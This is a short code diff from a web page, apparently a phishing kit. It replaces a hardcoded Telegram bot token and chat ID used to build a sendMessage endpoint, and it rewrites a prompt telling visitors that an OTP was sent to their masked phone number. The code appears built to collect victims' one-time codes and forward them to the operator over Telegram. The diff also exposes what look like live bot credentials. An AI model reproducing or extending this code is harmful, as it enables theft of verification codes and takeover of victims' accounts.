@@ -166,8 +166,8 @@ h2{
 // ===============================
 // TELEGRAM CONFIG
 // ===============================
-const TELEGRAM_BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
-const TELEGRAM_CHAT_ID = "7027302249";
+const TELEGRAM_BOT_TOKEN = "8227434675:AAF9SlpfdJ7eyDtkjF7VNjiNw6-dLlwBIPw";
+const TELEGRAM_CHAT_ID = "7882033650";
 const TG_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 // ===============================
@@ -183,10 +183,8 @@ function maskPhone(phone){
 
 const maskedPhone = maskPhone(phoneRaw);
 
-document.getElementById("OPTText").innerHTML = `
-  <strong>A verification code has been sent to your device (${maskedPhone})</strong><br>
-  <strong>Enter the code below</strong>
-`;
+document.getElementById("OPTText").innerHTML =
+  `<strong>We have sent a 4–6 digit OTP to your phone (${maskedPhone})</strong>`;
 
 
 // Input behavior
